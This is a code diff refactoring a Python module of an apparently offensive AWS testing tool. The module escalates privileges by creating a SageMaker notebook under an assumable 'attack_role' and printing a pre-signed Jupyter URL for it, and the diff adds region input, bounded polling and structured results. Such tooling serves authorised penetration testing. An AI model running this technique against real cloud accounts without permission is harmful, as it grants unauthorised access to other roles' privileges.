@@ -1,8 +1,7 @@
-from time import sleep
 import botocore
 from colorama import Fore, Style
 from modules.enumeration import iam_enumerate_assume_role
-from functions import create_client
+from functions import create_client, utils
 
 def help():
     print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
@@ -84,9 +83,8 @@ def parse_assumable_role_option(role_list):
     else:
         print(Fore.RED + "[-] No roles to impersonate found..." + Style.RESET_ALL)
 
-def create_notebook(botoconfig, session, attack_role):
+def create_notebook(botoconfig, session, attack_role, region):
     service = 'sagemaker'
-    region = input("Please specify a region to create the notebook: ")
     try:
         client = session.client(service, config=botoconfig, region_name=region)
         notebook_arn = client.create_notebook_instance(
@@ -100,6 +98,20 @@ def create_notebook(botoconfig, session, attack_role):
         print("[-] It was "+Fore.RED+"not possible "+Style.RESET_ALL+"to create a notebook...please check if you have the apropriate permissions")
         print(e)
         return False
+
+
+def collect_inputs(required_permissions, assumable_roles):
+    if not required_permissions:
+        option = input("\n[-] KintoUn was "+Fore.RED+"not able"+Style.RESET_ALL+" to identity the required permissions...\n[-] This can be due to generic permissions like '*'...\n\nDo you want to continue executing the module? [y/N]: ")
+        if not option or option.lower() == "n":
+            return None
+
+    attack_role = parse_assumable_role_option(assumable_roles)
+    if not attack_role:
+        return None
+
+    region = input("Please specify a region to create the notebook: ")
+    return attack_role, region
 
 def check_notebook_status(sagemaker_client):
     status = sagemaker_client.list_notebook_instances(
@@ -127,42 +139,43 @@ def create_presigned_url(sagemaker_client):
         return False
 
 def main(botoconfig, session, selected_session=None):
+    results = {}
     print(Fore.YELLOW + "\n================================================================================================" + Style.RESET_ALL)
     print("[+] Starting SageMaker privilege escalation module...")
     print("[+] Checking for required permissions...")
 
     required_permissions = check_permissions(selected_session)
 
-    if not required_permissions:
-        option = input("\n[-] KintoUn was "+Fore.RED+"not able"+Style.RESET_ALL+" to identity the required permissions...\n[-] This can be due to generic permissions like '*'...\n\nDo you want to continue executing the module? [y/N]: ")
-        if not option or option.lower() == "n":
-            print("[-] Exiting module...")
-            return
-
     print("[+] Checking for roles that can be assumed by SageMaker...")
     assumable_roles = check_assumable_roles(botoconfig, session)
-    attack_role = parse_assumable_role_option(assumable_roles)
-    if not attack_role:
-        return False
+    selected_inputs = collect_inputs(required_permissions, assumable_roles)
+    if not selected_inputs:
+        print("[-] Exiting module...")
+        return utils.module_result(status="error", errors=["Missing required input"])
+
+    attack_role, region = selected_inputs
 
     print("[+] Using the following role to create notebook: "+Fore.GREEN+"{}".format(attack_role)+Style.RESET_ALL)
-    notebook_result = create_notebook(botoconfig, session, attack_role)
+    notebook_result = create_notebook(botoconfig, session, attack_role, region)
     if not notebook_result:
-        return False
+        return utils.module_result(status="error", errors=["Failed to create notebook"])
 
-    notebook_arn, sagemaker_client, region = notebook_result
+    notebook_arn, sagemaker_client, created_region = notebook_result
+    if created_region != region:
+        region = created_region
     print("[+] Notebook Arn: "+Fore.GREEN+"{}".format(notebook_arn['NotebookInstanceArn'])+Style.RESET_ALL)
+    results["NotebookArn"] = notebook_arn.get("NotebookInstanceArn")
 
     print("[+] Waiting for notebook to activate...this can take some time...")
     sagemaker_client = session.client('sagemaker', config=botoconfig, region_name=region)
-    while True:
-        token = check_notebook_status(sagemaker_client)
-        if token:
-            break
-        sleep(10)
+    token = utils.poll_until(lambda: check_notebook_status(sagemaker_client), interval_seconds=10, max_attempts=72)
+    if not token:
+        return utils.module_result(status="error", errors=["Timed out waiting for notebook to become InService"])
 
     print("[+] Creating pre-signed url for jupyter notebook...")
     signed_url = create_presigned_url(sagemaker_client)
     if not signed_url:
-        return False
+        return utils.module_result(status="error", errors=["Failed to create pre-signed URL"])
+    results["AuthorizedUrl"] = signed_url.get("AuthorizedUrl")
     print("[+] Signed Url: "+Fore.GREEN+"{}".format(signed_url['AuthorizedUrl'])+Style.RESET_ALL)
+    return utils.module_result(data=results)
